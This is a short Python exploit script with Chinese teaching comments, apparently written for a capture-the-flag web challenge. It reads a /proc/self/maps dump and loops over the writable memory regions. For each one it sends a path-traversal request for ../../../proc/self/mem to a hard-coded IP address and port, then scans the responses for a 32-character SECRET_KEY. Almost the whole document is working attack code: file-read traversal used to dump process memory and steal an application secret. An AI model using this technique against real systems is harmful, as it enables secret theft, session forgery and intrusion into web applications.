import re
import requests

maps = open('test1.txt')  # 打开名为 'test.txt' 的文件并赋值给变量 maps
b = maps.read()  # 读取文件内容并赋值给变量 b
lst = b.split('\\n')  # 根据换行符 '\n' 将文件内容拆分为列表，并赋值给变量 lst，映射表中的内容是一行一行的。

for line in lst:  # 遍历列表 lst 中的每一行内容
    if 'rw' in line:  # 如果当前行包含 'rw'，'rw' 代表该内存区域可读可写，'r'代表可读，'w'代表可写
        addr = re.search('([0-9a-f]+)-([0-9a-f]+)', line)  # 使用正则表达式在当前行中搜索地址范围并保存到变量 addr 中
        start = int(addr.group(1), 16)  # 将地址范围的起始地址从十六进制转换为十进制，并赋值给变量 start
        end = int(addr.group(2), 16)  # 将地址范围的结束地址从十六进制转换为十进制，并赋值给变量 end
        print(start, end)  # 打印起始地址和结束地址

        # 构造请求URL，用于读取 /proc/self/mem 文件的特定区域
        url = f"http://61.147.171.103:60156/info?file=../../../proc/self/mem&start={start}&end={end}"

        # 发送 GET 请求并获取响应
        response = requests.get(url)

        # 使用正则表达式从响应文本中找到符合指定格式的 SECRET_KEY
        secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", response.text)

        # 如果找到了 SECRET_KEY，则打印并结束循环
        if secret_key:
            print(secret_key)
            break